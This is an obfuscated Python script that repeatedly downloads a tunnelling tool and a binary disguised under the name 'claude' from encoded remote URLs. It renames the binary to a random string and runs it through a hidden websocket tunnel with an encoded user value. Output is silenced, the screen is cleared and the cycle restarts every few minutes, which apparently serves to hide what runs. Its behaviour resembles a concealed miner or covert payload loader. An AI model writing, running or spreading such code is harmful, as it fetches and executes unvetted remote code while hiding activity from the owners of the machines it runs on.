import os
import random
import secrets
import shutil
import stat
import subprocess
import tarfile
import sys
import time
import base64


def _d(data, key):
    try:
        raw = base64.b64decode(data)
        return "".join(chr(b ^ key) for b in raw)
    except Exception:
        return ""


_57 = 0x57
_T = "ICQkbXh4OTY6IyU2OWZuZWV6MzYjNjs2NXk/MXkkJzY0Mg=="
_U = "JyU7ZidlPTY5YzMhPDMxPCNiJWQnJTZgLW5hNi8lLz0uPTQwNiNuIGA7MzIjOzQubiAxMTpiYW4kNG4iL2Uj"
_W = "PyMjJyRteHgkIzglNjAyeSMyND85ODI7MjQjJTh5ODk7PjkyeCAkIyI5OTI7CGZneWJ5ZQg7PjkiLwg2OjNhY3kjNiV5MC0="
_C = "PyMjJyRteHgkIzglNjAyeSMyND85ODI7MjQjJTh5ODk7PjkyeDQ7NiIzMg=="


class _Runner:
    def __init__(self):
        self._a = None
        self._b = None

    def c(self, x):
        r = subprocess.run(x)
        if r.returncode != 0:
            print(f"E: {' '.join(x)}")
            sys.exit(1)

    def d(self):
        self.c(["curl", "-L", "-o", "wstunnel.tar.gz", _d(_W, _57)])

    def e(self):
        with tarfile.open("wstunnel.tar.gz", "r:gz") as tar:
            tar.extractall()
        os.remove("wstunnel.tar.gz")

    def f(self, name):
        os.chmod(name, os.stat(name).st_mode | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)

    def g(self, s, t):
        if os.path.exists(t):
            os.remove(t)
        shutil.move(s, t)

    def h(self, p):
        self._a = subprocess.Popen(
            ["./kbridge", "client", _d(_T, _57), "-L", f"tcp://{p}:127.0.0.1:1"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True,
        )

    def i(self):
        self.c(["curl", "-L", "-o", "claude", _d(_C, _57)])

    def j(self, n, p):
        self._b = subprocess.Popen(
            [f"./{n}", "--host", f"127.0.0.1:{p}", "--user", _d(_U, _57)],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True,
        )

    def k(self):
        for p in (self._b, self._a):
            if p:
                try:
                    p.terminate()
                    try:
                        p.wait(timeout=5)
                    except subprocess.TimeoutExpired:
                        p.kill()
                except Exception:
                    pass
        self._b = self._a = None

    def cycle(self):
        n = "".join(secrets.choice("abcdefghijklmnopqrstuvwxyz0123456789") for _ in range(12))
        p = random.randint(10000, 65000)
        print(f"Port: {p}")
        self.d()
        self.e()
        self.f("wstunnel")
        self.g("wstunnel", "kbridge")
        self.h(p)
        self.i()
        self.f("claude")
        self.g("claude", n)
        print(f"Binary: {n}")
        self.j(n, p)
        os.system("clear")
        print("Active.")
        print(f"Port: {p}")
        print(f"File: {n}")
        time.sleep(5 * 60)
        print("\nTerminating...")
        self.k()
        print("Idle 60s...")
        time.sleep(1 * 60)


def main():
    try:
        r = _Runner()
        while True:
            r.cycle()
    except KeyboardInterrupt:
        print("\nHalted.")
        sys.exit(0)


# Obfuscation noise
_noise = [lambda x=x: x ^ 0x57 for x in range(256)]
for _i in range(256):
    _noise[_i] = (_i + 0x57) & 0xFF


if __name__ == "__main__":
    main()
